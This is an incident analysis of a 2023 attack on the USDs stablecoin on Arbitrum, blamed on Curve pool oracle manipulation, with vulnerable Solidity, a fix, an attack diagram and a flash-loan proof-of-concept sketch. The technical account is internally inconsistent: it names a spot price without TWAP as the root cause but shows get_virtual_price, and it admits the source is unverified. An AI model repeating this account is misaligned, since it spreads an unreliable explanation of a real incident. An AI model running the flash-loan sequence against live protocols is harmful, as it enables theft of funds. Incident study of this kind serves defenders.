# USDs — Stablecoin Attack via Curve Pool Manipulation

| Field | Details |
|------|------|
| **Date** | 2023-02-15 |
| **Protocol** | USDs (Sperax) |
| **Chain** | Arbitrum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | Arbitrum Transaction |
| **Vulnerable Contract** | USDs Protocol |
| **Root Cause** | Curve pool spot price used directly as oracle without TWAP, allowing price manipulation via large swaps within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/USDs_exp.sol) |

---
## 1. Vulnerability Overview

USDs is an algorithmic stablecoin operating on Arbitrum that uses price data from a Curve pool as its oracle. The attacker manipulated the in-pool price by adding or removing large amounts of liquidity to/from the Curve pool, then exploited the manipulated price to mint USDs at a discount or redeem them at a premium for profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Using Curve pool spot price as the USDs oracle
function getUSPriceFromCurve() internal view returns (uint256) {
    // ❌ Uses the current virtual_price of the Curve pool
    uint256 virtualPrice = curvePool.get_virtual_price();
    return virtualPrice;  // Can be altered via flash loan
}

function mintUSDs(uint256 collateralAmount) external {
    uint256 collateralPrice = getUSPriceFromCurve();
    // ❌ USDs mint amount determined using manipulated price
    uint256 usdsAmount = collateralAmount * collateralPrice / BASE;
    _mint(msg.sender, usdsAmount);
}

// ✅ Fix: Use Chainlink oracle
function mintUSDs(uint256 collateralAmount) external {
    (, int256 price,,,) = chainlinkFeed.latestRoundData();
    uint256 usdsAmount = collateralAmount * uint256(price) / BASE;
    _mint(msg.sender, usdsAmount);
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Curve pool spot price used directly as oracle without TWAP, allowing price manipulation via large swaps within a single block
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Flash Loan (borrow large amount of stablecoins)
  │
  ├─2─▶ Deposit large amount into Curve pool → alter virtual_price
  │       USDs collateral price becomes manipulated
  │
  ├─3─▶ Mint or redeem USDs favorably using manipulated price
  │
  ├─4─▶ Remove Curve liquidity
  │
  └─5─▶ Repay flash loan → net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function attack(uint256 flashAmount) internal {
    // 1. Manipulate Curve pool price
    // Add large amount of stablecoins to Curve to alter virtual_price
    stableToken.approve(address(curvePool), flashAmount);
    curvePool.add_liquidity([flashAmount, 0], 0);

    // 2. Mint USDs favorably using manipulated virtual_price
    uint256 usdsAmount = usds.mint(collateral, /* based on manipulated price */);

    // 3. Remove Curve liquidity (recover principal)
    curvePool.remove_liquidity(lpAmount, [0, 0]);

    // 4. Swap USDs for another stablecoin to realize profit
    exchangeUSDs(usdsAmount);

    // 5. Repay flash loan
    stableToken.transfer(lender, flashAmount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Curve Price Oracle Manipulation |
| **Attack Vector** | Flash Loan + Curve virtual_price Manipulation |
| **Impact Scope** | USDs stablecoin minting mechanism |
| **DASP Classification** | Oracle Manipulation |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |

## 6. Remediation Recommendations

1. **Use Chainlink Oracle**: Replace Curve virtual_price with an independent external oracle.
2. **Curve TWAP**: Use Curve's time-weighted average price.
3. **Mint Cap**: Enforce an upper limit on USDs mintable in a single transaction.

## 7. Lessons Learned

- Algorithmic stablecoin price oracles must not rely on manipulable sources.
- Curve's `virtual_price` is relatively stable but can still be manipulated via large-scale flash loans.
- This is a repeat of the same Curve-based oracle vulnerability seen in Midas Capital (2023-01-18).